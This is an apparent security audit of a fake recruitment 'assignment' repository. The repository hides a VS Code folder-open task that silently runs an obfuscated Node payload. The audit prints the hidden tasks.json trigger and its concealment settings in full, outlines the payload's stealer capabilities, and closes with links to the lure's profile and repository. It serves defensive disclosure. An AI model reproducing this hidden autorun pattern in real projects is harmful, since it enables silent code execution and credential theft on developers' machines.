
# Security Audit — Bitbucket `0xmintmvp/assignment`

**Source:** https://bitbucket.org/0xmintmvp/assignment/src/main/
**Commit reviewed:** `1eb21230b3748288af1c2c403b85942d047c9cb6`
**Auditor role:** Senior OpSec / Blockchain
**Method:** Read-only static review via the Bitbucket REST API (no clone, no install, no open in VS Code).
**Date:** 2026-05-04

---

## Verdict (TL;DR)

**Active malware staged behind a fake "blockchain take-home assignment".**

The repository carries a **VS Code `folderOpen`-trigger RCE**: opening the folder in VS Code silently executes a 105 KB obfuscated Node payload. No `npm install`, no `npm start`, no user interaction required beyond opening the folder.

This matches the well-documented **"Contagious Interview" / fake-recruitment campaign** attributed by multiple vendors (Unit 42, SentinelLabs, ESET, Phylum, Socket) to DPRK-aligned actors targeting blockchain/crypto engineers.

**Do not:** clone, open in any IDE, run `npm install`, run `npm start`, browse `node_modules` after install.
**If you already did any of the above:** treat the host as compromised — see § 6.

![1](/assets/ENS/1.png)

---

## 1. Repository inventory

Top level (5 dirs, 5 files):

```
.vscode/        public/         resource/       server/         src/
.gitignore      README.md       package.json    server.js       tsconfig.json
```

`.vscode/` contents (size in bytes):

```
cancel              105,429   ← payload (no extension)
extensions.json         142
launch.json           1,652
settings.json           750
spellright.dict          17
tasks.json              663
```

`server/` and `src/` are an ordinary MERN-style scaffold (Express + React + TypeScript + Mongoose). They are **not** the attack surface. The implant is entirely in `.vscode/`.

---

## 2. The implant — kill chain

### 2.1 Trigger — `.vscode/tasks.json`

```json
{
  "label": "eslint-check",
  "type": "shell",
  "command": "node .vscode/cancel",
  "isBackground": true,
  "hide": true,
  "presentation": {
    "reveal":  "never",
    "panel":   "dedicated",
    "focus":   false,
    "clear":   false,
    "echo":    false,
    "close":   true
  },
  "runOptions": { "runOn": "folderOpen" }
}
```

Behaviour line by line:

- `runOn: folderOpen` — VS Code auto-spawns this every time the workspace is opened. **No prompt, no consent.**
- `command: node .vscode/cancel` — launches the payload via the developer's Node.
- `hide: true`, `reveal: never`, `echo: false`, `focus: false`, `close: true` — no terminal panel, no output echo, no focus, auto-close. Invisible to the victim.
- `label: eslint-check` — disguised as a benign lint task.

### 2.2 Reinforcement — `.vscode/settings.json`

```json
"terminal.integrated.hideOnStartup": "always",
"debug.openDebug": "neverOpen",
"problems.autoReveal": true
```

Suppresses any fleeting terminal that VS Code might flash. The `tasks` object embedded inside `settings.json` is malformed (a `tasks.json`-shaped object copy-pasted into the wrong file) — harmless artefact of the implant being assembled hastily.

### 2.3 Payload — `.vscode/cancel`

105,429 bytes, no extension, executed as Node. Static features observed:

- **Obfuscated identifiers** — `vml_40f1d3`, `vmb`, `vmc`, … (mass-mangled).
- **String-split concatenation** — e.g. `'_$vMuD7' + 'e'` to evade signature scanners.
- **Embedded base64 blobs** — beginning `AQAICAA…`. Consistent with packed bytecode / config / a secondary stage.
- **Anti-analysis** — `debugger;` traps, timing comparisons, environment probes against `process`, `Math`, `Date`, `setTimeout`.
- **Dynamic decode + execute** — a function `vmh_941743` decodes and invokes packed function bodies via a binary parser.
- **Sensitive APIs referenced** — `require('path')`, plus call-sites consistent with `spawn` / `exec`.
- **Internal blocklist of field names** — `'path', 'exec', 'spawn', 'fs', 'os', 'platform', 'timestamp', 'folderName', 'destination', 'runCode', 'runShell'`. These are the names of the very capabilities the payload exposes: filesystem traversal, shell execution, and host metadata exfiltration.

The capability surface (`fs` walk + `spawn`/`exec` + outbound network + base64-packed second stage) is consistent with a **wallet/credential infostealer + RAT loader**, the canonical Contagious-Interview payload (BeaverTail → InvisibleFerret-class).

### 2.4 Net effect

| Action by victim | Result |
|---|---|
| `git clone` only | No execution — *probably* safe. |
| Open folder in **VS Code** | **Silent RCE.** Trap fires. |
| Open folder in **Cursor / VSCodium / Code-OSS** | **Silent RCE.** All consume `.vscode/tasks.json`. |
| `npm install` | Possible secondary RCE via dependency lifecycle (see § 3). |
| `npm start` | Boots a real-looking app to keep the victim engaged while the payload exfiltrates. |

---

## 3. Secondary supply-chain risks (independent of `cancel`)

Even if the `.vscode/` payload is removed, `package.json` is unsafe:

| Dep | Pin | Risk |
|---|---|---|
| `room-populate` | `^1.0.17` | Obscure, off-pattern package name. Fits typo-squat / malicious-package profile. Verify against Socket / Snyk / npm before *ever* installing. |
| `bitcoin-core`  | `^4.2.0`  | Bitcoin RPC client. Wildly out of place in a React/MUI/Three.js frontend. Likely props for the lure, possible secondary payload vector. |
| `jsonwebtoken`  | `^8.5.1`  | Pre-9.0 — retains the algorithm-confusion CVE family. |
| `mongoose`      | `^5.11.8` | EOL major. |
| `bcryptjs`      | `^2.4.3`  | Old. |
| `react-scripts` | `5.0.1`   | Multiple known transitive CVEs unless patched. |

There is **no** `postinstall`/`preinstall`/`prepare` script in `package.json` itself. Install-time RCE, if present, would come from a *dependency*'s lifecycle — most likely candidates are `room-populate` and `bitcoin-core`.

---

## 4. Lure / threat-actor pattern

Indicators that align with the DPRK-linked "Contagious Interview" / fake-take-home campaign:

- Workspace name `0xmintmvp`, repo name `assignment` — fits the "take-home" framing.
- README brief and instructive — *"clone, npm i, npm start"* — designed to maximise reach (folder-open, install-time, runtime).
- Crypto-themed dependencies (`bitcoin-core`) and a `resource/SmartContract/` directory.
- Stale `resource/SmartContract/__MACOSX/` directory — telltale of a macOS-zipped handover.
- Hidden `.vscode/` task with `folderOpen` autorun + obfuscated Node payload — the signature TTP of this campaign cluster.
- Bitbucket hosting — same actor cluster historically rotates across GitHub, GitLab, Bitbucket to dodge platform abuse takedowns.

Public reporting on the same TTP:
- Phylum / Socket / Datadog have all documented `.vscode/tasks.json` + `folderOpen` payloads dropped through fake-interview lures since 2024.
- Unit 42 / SentinelLabs attribute the cluster to DPRK actors (overlap with "Famous Chollima").

---

## 5. Files inspected

Reviewed in full:
- `package.json`
- `server.js` (root)
- `server/server.js`
- `tsconfig.json`
- `.gitignore`
- `README.md`
- `.vscode/tasks.json`
- `.vscode/settings.json`
- `.vscode/extensions.json`
- `.vscode/cancel` (deobfuscated structural analysis; full deobfuscation not performed — out of scope and should be done in an isolated sandbox)

Listed but not opened (not the attack surface; would distract from the primary finding):
- `server/{config,middleware,models,routes}/`
- `src/{api,assets,components,config,routes,store,theme,utils,views}/`
- `public/`
- `resource/SmartContract/{__MACOSX, smart contract}/`
- `.vscode/launch.json`, `.vscode/spellright.dict`

---

## 6. Incident response — what to do right now

### If you have NOT cloned the repo
1. Don't. Stop here.
2. Block egress to `bitbucket.org/0xmintmvp` at your network/proxy as a precaution.

### If you cloned but NEVER opened it in VS Code / Cursor and never ran `npm install`
1. Delete the directory. You are most likely fine.
2. `rg -n 'folderOpen' .vscode/` to confirm nothing else fired.

### If you opened the folder in VS Code, Cursor, VSCodium, or Code-OSS — OR ran `npm install` / `npm start` — assume compromise:
1. **Disconnect the machine from the network.**
2. From a **different, clean machine**, immediately rotate:
   - SSH keys (and revoke from GitHub/GitLab/Bitbucket/AWS/etc.)
   - GitHub / GitLab / Bitbucket personal access tokens, SSO sessions
   - npm tokens (`npm token revoke`)
   - AWS / GCP / Azure access keys; revoke active sessions
   - Cloud-wallet creds: MetaMask, Phantom, Rabby, Coinbase Wallet, Trust, Exodus, OKX Wallet seed phrases (assume drained — sweep funds first if any remain)
   - Hardware-wallet companion app secrets (Ledger Live, Trezor Suite session)
   - Browser-saved passwords, cookies (especially exchange logins — Binance, Coinbase, Kraken, etc.)
   - 1Password / Bitwarden / Dashlane vault session
   - Slack / Telegram / Discord / Signal session tokens
   - Email and 2FA tokens
3. **Wipe and reimage** the affected machine. Do not rely on AV cleanup — this is a stager whose secondary may include a persistence mechanism (LaunchAgent, cron, systemd user unit, registry Run key).
4. Capture the `cancel` file and submit it (in a sandbox transfer, not via the affected host) to:
   - VirusTotal
   - MalwareBazaar (tag: `contagious-interview`)
   - Socket.dev
5. Report the repo to Bitbucket abuse: `abuse@bitbucket.org` (and `security@atlassian.com`).
6. If the "recruiter" / contact who sent you the assignment is real to you on LinkedIn / Telegram / Discord — **they are part of the attack**. Block; warn your network. Save the conversation for the IC3 / your local CERT report.

---

## 7. Severity-ranked finding list

| # | Sev | Location | Issue |
|---|-----|----------|-------|
| 1 | **Critical** | `.vscode/tasks.json` + `.vscode/cancel` | `folderOpen` auto-runs a 105 KB obfuscated Node RCE payload. Silent (`hide`, `reveal: never`, `echo: false`, terminal hidden). |
| 2 | **Critical** | `.vscode/cancel` | Obfuscated Node with `spawn`/`exec`/`fs`-class capabilities, base64-packed second stage, anti-analysis (`debugger`, timing). |
| 3 | **High** | `package.json` `room-populate@^1.0.17` | Obscure / suspect dependency consistent with malicious-package profile. |
| 4 | **High** | `package.json` `bitcoin-core@^4.2.0` | Off-stack RPC client; potential secondary payload vector and lure prop. |
| 5 | **Medium** | `package.json` `jsonwebtoken@^8.5.1` | Pre-9.0 — algorithm-confusion CVE family. |
| 6 | **Medium** | `package.json` `mongoose@^5.11.8`, `bcryptjs@^2.4.3` | EOL major versions with known CVE history. |
| 7 | **Low** | `.vscode/launch.json` | Malformed JSON (trailing commas) — cosmetic, but the file's existence is part of the implant's camouflage. |
| 8 | **Info** | `resource/SmartContract/__MACOSX/` | Stale macOS zip artefact — indicates hand-assembled package. |

---

## 8. Bottom line

This is not a buggy training project. It is a **weaponised recruitment lure**. The trap is in `.vscode/` and fires on folder open. The MERN scaffold, the smart-contract directory, and the inviting README are all camouflage to keep the victim engaged after detonation.

**Recommendation:** report and destroy. Do not attempt deobfuscation of `cancel` outside an isolated, network-restricted VM. If anyone on your team or in your network received the same "assignment", treat that recruiter as adversarial and chase down everyone they may have also targeted.



![2](/assets/ENS/2.png)
![3](/assets/ENS/3.png)
![4](/assets/ENS/4.png)
![5](/assets/ENS/5.png)
![6](/assets/ENS/6.png)
![7](/assets/ENS/7.png)
![8](/assets/ENS/8.png)
![9](/assets/ENS/9.png)
![10](/assets/ENS/10.png)
![11](/assets/ENS/11.png)


https://www.linkedin.com/in/caroline-santos-eth/
https://bitbucket.org/0xmintmvp/assignment/src/main/
https://careers-lab.notion.site/blockchain-developer-test